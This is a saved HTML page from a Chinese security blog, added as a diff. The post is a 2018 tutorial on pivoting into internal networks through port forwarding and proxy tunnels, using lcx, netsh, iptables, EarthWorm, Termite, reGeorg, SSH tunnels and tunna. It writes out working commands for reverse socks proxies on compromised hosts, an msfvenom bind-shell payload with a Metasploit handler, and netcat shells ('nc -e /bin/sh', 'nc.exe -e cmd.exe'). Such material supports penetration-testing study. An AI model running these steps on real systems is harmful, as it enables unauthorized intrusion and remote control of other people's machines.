@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="工具,内网渗透,端口转发,代理转发," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="跟着l3m0n师傅那篇文章来动手做一遍，再加入一些自己的拓展及理解 端口转发工具windowslcx lcx是一款强大的内网端口转发工具，前提是目标服务器必须要能访问外网 先在本机设置监听： 1lcx -listen 1111 2222 其中1111位转发端口，2222位任意未被占用端口 在目标机上开启转发： 1lcx -slave 本机IP 1111 127.0.0.1 3389 然后就可以在本">
+<meta name="keywords" content="工具,内网渗透,端口转发,代理转发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="磨皮皮之端口及代理转发">
+<meta property="og:url" content="http://eagerseven.cn/2018/04/25/磨皮皮之端口及代理转发/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="跟着l3m0n师傅那篇文章来动手做一遍，再加入一些自己的拓展及理解 端口转发工具windowslcx lcx是一款强大的内网端口转发工具，前提是目标服务器必须要能访问外网 先在本机设置监听： 1lcx -listen 1111 2222 其中1111位转发端口，2222位任意未被占用端口 在目标机上开启转发： 1lcx -slave 本机IP 1111 127.0.0.1 3389 然后就可以在本">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fq6r4ryt2hj30m80gv74b.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fq7kkgox50j30im07kq2r.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fq7kl8ch2ej30ge01k0j2.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fq7kmkrlplj30hx07w3yb.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fq80cghy65j30hs08z3yb.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fq8yrwsy6kj30hv0213y9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fq8ysmonuzj30hc0asa9x.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fq8z4cxidoj30et058q2q.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fq8z4n2oqzj30hv0a6q2s.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fq8ztnl1tjj30hw02yjr5.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fq8zunliz2j30hs01q0n7.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fq8zuxu4wtj30hu034gld.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fq8zxfjtewj30a60bsweb.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fq92b4y70uj30ht01it8i.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fq92bh5omgj30ht01xa9u.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fq92bqw9cqj30hu01v0si.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fq92c2t2sij30hs07ydfq.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fq92ci02auj30ex052mx1.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/04/12/5acf595c04406.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/04/12/5acf5a53127e8.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/04/12/5acf5b70bb0ab.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/04/12/5acf5cba72403.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/04/12/5acf5cf8f241d.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/04/12/5acf5d594463e.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/04/12/5acf5dbc13d58.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqc1b0q68lj30z609igpo.jpg">
+<meta property="og:updated_time" content="2018-11-14T07:25:42.280Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="磨皮皮之端口及代理转发">
+<meta name="twitter:description" content="跟着l3m0n师傅那篇文章来动手做一遍，再加入一些自己的拓展及理解 端口转发工具windowslcx lcx是一款强大的内网端口转发工具，前提是目标服务器必须要能访问外网 先在本机设置监听： 1lcx -listen 1111 2222 其中1111位转发端口，2222位任意未被占用端口 在目标机上开启转发： 1lcx -slave 本机IP 1111 127.0.0.1 3389 然后就可以在本">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fq6r4ryt2hj30m80gv74b.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/04/25/磨皮皮之端口及代理转发/"/>
+
+
+
+
+
+  <title>磨皮皮之端口及代理转发 | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/04/25/磨皮皮之端口及代理转发/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">磨皮皮之端口及代理转发</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-25T10:55:00+08:00">
+                2018-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1,795
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>跟着l3m0n师傅那篇文章来动手做一遍，再加入一些自己的拓展及理解</p>
+<h3 id="端口转发工具"><a href="#端口转发工具" class="headerlink" title="端口转发工具"></a>端口转发工具</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p><strong>lcx</strong></p>
+<p>lcx是一款强大的内网端口转发工具，前提是目标服务器必须要能访问外网</p>
+<p>先在本机设置监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 1111 2222</span><br></pre></td></tr></table></figure>
+<p>其中1111位转发端口，2222位任意未被占用端口</p>
+<p>在目标机上开启转发：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave 本机IP 1111 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+<p>然后就可以在本机上直接连接目标机3389端口了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc 127.0.0.1:2222</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fq6r4ryt2hj30m80gv74b.jpg" alt=""></p>
+<p>但是我在本地练习的时候每次连接一会就会出现lcx.exe停止工作</p>
+<p>除此之外，还可以利用VPS的lcx来进行内网映射</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vps:lcx.exe -listen 8080 80</span><br><span class="line">目标服务器：lcx.exe -slave vps_ip 80 本机IP 80</span><br><span class="line">本地电脑：http://vps_ip:8080</span><br></pre></td></tr></table></figure>
+<p>原理和上面一样</p>
+<p><strong>netsh</strong></p>
+<p>netsh是Windows自带的端口转发工具，只支持tcp协议</p>
+<p>需要一台双网卡的服务器，在虚拟机上实验时，只需要增加一个IP就行</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fq7kkgox50j30im07kq2r.jpg" alt=""></p>
+<p>如果是在xp上还需要安装ipv6</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fq7kl8ch2ej30ge01k0j2.jpg" alt=""></p>
+<p>添加转发规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy set v4tov4 listenaddress=本地IP lestenport=本地端口 connectaddress=目标IP connectport=目标端口</span><br></pre></td></tr></table></figure>
+<p>添加防火墙入站规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;transit test&quot; protocol=TCP dir=in localport=7777 action=allow</span><br></pre></td></tr></table></figure>
+<p>查看转发规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+<p>删除某条转发规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenaddress=x.x.x.x listenport=x</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fq7kmkrlplj30hx07w3yb.jpg" alt=""></p>
+<p>然后直接连接192.168.120.8:3333就能连接到192.168.120.9:3389</p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p><strong>iptables</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">service iptables stop</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 本地IP --dport 本地端口 -j DNAT --to-destination 目标IP:目标端口</span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 目标IP --dport 目标端口 -j SNAT --to-source 本地IP</span><br><span class="line">service iptables save</span><br><span class="line">service iptables start</span><br></pre></td></tr></table></figure>
+<h3 id="边界代理工具"><a href="#边界代理工具" class="headerlink" title="边界代理工具"></a>边界代理工具</h3><h4 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h4><h5 id="xscoks"><a href="#xscoks" class="headerlink" title="xscoks"></a>xscoks</h5><p>主要参数为</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fq80cghy65j30hs08z3yb.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xsocks -t -p1 8085 -p2 8086</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fq8yrwsy6kj30hv0213y9.jpg" alt=""></p>
+<p>肉鸡服务器上用proxifier进行连接</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fq8ysmonuzj30hc0asa9x.jpg" alt=""></p>
+<h5 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h5><p>这是一款跨平台的工具：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fq8z4cxidoj30et058q2q.jpg" alt=""></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fq8z4n2oqzj30hv0a6q2s.jpg" alt=""></p>
+<p>首先在肉鸡服务器上建立监听(socks5监听1080端口，8888是接收内网的反弹端口)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fq8ztnl1tjj30hw02yjr5.jpg" alt=""></p>
+<p>接着在内网机器上执行反弹命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 肉鸡服务器IP -e 8888</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fq8zunliz2j30hs01q0n7.jpg" alt=""></p>
+<p>此时能看到肉鸡服务器上接收到了一个反弹</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fq8zuxu4wtj30hu034gld.jpg" alt=""></p>
+<p>然后在本地攻击机上利用proxifier打通通道</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fq8zxfjtewj30a60bsweb.jpg" alt=""></p>
+<p>此时就打通了本机和内网机器的通道了</p>
+<p><strong>termite</strong></p>
+<p>termite作为earthworm的升级版，必须学一下</p>
+<p>首先在本机（或vps）上执行监听命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent_windows_x86.exe -l 888</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fq92b4y70uj30ht01it8i.jpg" alt=""></p>
+<p>接着在目标机器上执行连接命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent_windows_x86.exe -c 192.168.1.181 -p 888</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fq92bh5omgj30ht01xa9u.jpg" alt=""></p>
+<p>再回到本机（或vps）上执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_windows_x86.exe -c 127.0.0.1 -p 888</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fq92bqw9cqj30hu01v0si.jpg" alt=""></p>
+<p>此时获取到了admin终端，可以看到有三个节点，选择第二个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">goto 2</span><br><span class="line">socks 1080</span><br><span class="line">shell 6666</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fq92c2t2sij30hs07ydfq.jpg" alt=""></p>
+<p>这时在本机（或vps）上利用nc得到shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 6666</span><br></pre></td></tr></table></figure>
+<p>到此就成功反弹了socks服务器，可以利用downfile和upfile命令下载和上传文件以及其他命令进行下一步的内网漫游</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fq92ci02auj30ex052mx1.jpg" alt=""></p>
+<p>如果权限较低，并且目标在两个防火墙（dmz）之间，只有web数据可以出来。此时可以利用基于http的转发与socket代理</p>
+<h5 id="reGeorg-proxifier"><a href="#reGeorg-proxifier" class="headerlink" title="reGeorg+proxifier"></a>reGeorg+proxifier</h5><p>下载的reGeorg包里面的内容有</p>
+<p><img src="https://i.loli.net/2018/04/12/5acf595c04406.jpg" alt=""></p>
+<p>将这个包上传到目标服务器的web服务器上</p>
+<p>在肉鸡服务器上直接访问：</p>
+<p><img src="https://i.loli.net/2018/04/12/5acf5a53127e8.jpg" alt=""></p>
+<p>然后在肉鸡服务器上运行代理工具</p>
+<p>这里需要注意的是，这里需要urllib3库，需要自行安装</p>
+<p><img src="https://i.loli.net/2018/04/12/5acf5b70bb0ab.jpg" alt=""></p>
+<p>然后打开proxifier设置代理服务器</p>
+<p><img src="https://i.loli.net/2018/04/12/5acf5cba72403.jpg" alt=""></p>
+<p>然后设置代理规则</p>
+<p><img src="https://i.loli.net/2018/04/12/5acf5cf8f241d.jpg" alt=""></p>
+<p>开始运行后的界面</p>
+<p><img src="https://i.loli.net/2018/04/12/5acf5d594463e.jpg" alt=""></p>
+<p>然后就能远程连接桌面了</p>
+<p><img src="https://i.loli.net/2018/04/12/5acf5dbc13d58.jpg" alt=""></p>
+<h5 id="ssh通道"><a href="#ssh通道" class="headerlink" title="ssh通道"></a>ssh通道</h5><p>ssh协议有三个很强大的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L listen_port:DST_Host:DST_port user@tunnel_host</span><br><span class="line">ssh -CfNg -R listen_port:DST_Host:DST_port user@tunnel_host</span><br><span class="line">ssh -CfNg -D listen_port user@tunnel_host</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-C：压缩数据传输</li>
+<li>-f：后台认证用户密码，通常与-N连用，不用登录到远程主机</li>
+<li>-N：不执行脚本命令，通常与-f连用</li>
+<li>-g：允许在本地主机建立连接</li>
+<li>-L：将本地主机的某个端口转发到远端指定机器的指定端口</li>
+<li>-R：将远程主机的某个端口转发到本地指定机器的指定端口</li>
+<li>-D：指定一个本地机器动态的应用程序端口转发</li>
+</ul>
+<p><strong>ssh远程转发</strong></p>
+<p>首先需要在公网主机上编辑配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">在末尾加上</span><br><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>
+<p>然后重启sshd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart sshd</span><br></pre></td></tr></table></figure>
+<p>接着利用如下命令建立一个ssh反向隧道</p>
+<p>在内网主机内执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3333:127.0.0.1:22 远程公网主机用户名@远程公网主机IP</span><br></pre></td></tr></table></figure>
+<p>在公网主机上执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 3333 localhost</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqc1b0q68lj30z609igpo.jpg" alt=""></p>
+<p><strong>ssh本地转发</strong></p>
+<p>和远程隧道类似</p>
+<p>在目标主机上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 3333:127.0.0.1:22 本地主机用户名@本地主机IP</span><br></pre></td></tr></table></figure>
+<p>在肉鸡服务器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 3333 localhost</span><br></pre></td></tr></table></figure>
+<p><strong>ssh维持连接</strong></p>
+<p>和上面的类似，只是在目标服务器上安装autossh，使用autossh命令来维持连接</p>
+<p><strong>ssh互联通道</strong></p>
+<p>除了以上的操作，我们还可以利用ssh反向隧道来使两台分别位于nat服务器后的两台主机通过一个公网IP服务器建立ssh通道连接</p>
+<p>首先还是跟之前一样修改sshd的配置文件</p>
+<p>然后在一台机器a上使用autossh命令连接到公网服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autossh -p 22 -M 7777 -NR &apos;*:7777:localhost:22&apos; 公网服务器用户@公网服务器IP</span><br></pre></td></tr></table></figure>
+<p>接着在另外一台主机b上通过公网服务器的7777端口连接到另外一台nat服务器之后的机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 7777 a用户@公网服务器IP</span><br></pre></td></tr></table></figure>
+<h5 id="ssh通道socket代理"><a href="#ssh通道socket代理" class="headerlink" title="ssh通道socket代理"></a>ssh通道socket代理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D port 远程主机IP</span><br></pre></td></tr></table></figure>
+<p>可以看到以tcp数据形式反弹了代理</p>
+<p>当防火墙对tcp有限制时，可以用imcp的形式进行反弹</p>
+<h5 id="直连shell端口转发"><a href="#直连shell端口转发" class="headerlink" title="直连shell端口转发"></a>直连shell端口转发</h5><p>当攻击机kali不在外网或目标在dmz里不能反弹shell 时，可通过这种直连shell然后通过http端口转发到本地的metasploit</p>
+<p>先生成一个bind_shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell/bind_tcp LPORT=12345 -f exe -o ./shell.exe</span><br></pre></td></tr></table></figure>
+<p>上传到肉鸡服务器上运行</p>
+<p>然后在攻击机kali上利用tunna工具包进行端口转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py -u http://l69.254.165.5/release/conn.jsp  -l 1111 -r 12345 v</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的是，l3m0n师傅给的tunna工具包里的conn.php有点问题，理由有一个函数未经定义就直接调用了，使用是报错，所以我们这里使用的是jsp，gayhub上的tunna项目的conn.php是完整的</p>
+<p>接着在攻击机上执行一个监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/shell/bind_tcp</span><br><span class="line">set LPORT 1111</span><br><span class="line">set RHOST 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>此时就会反弹一个shell</p>
+<p><strong>正向shell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh -lp 1234</span><br><span class="line">nc.exe -e cmd.exe -lp 1234</span><br></pre></td></tr></table></figure>
+<hr>
+<p>路还很长</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
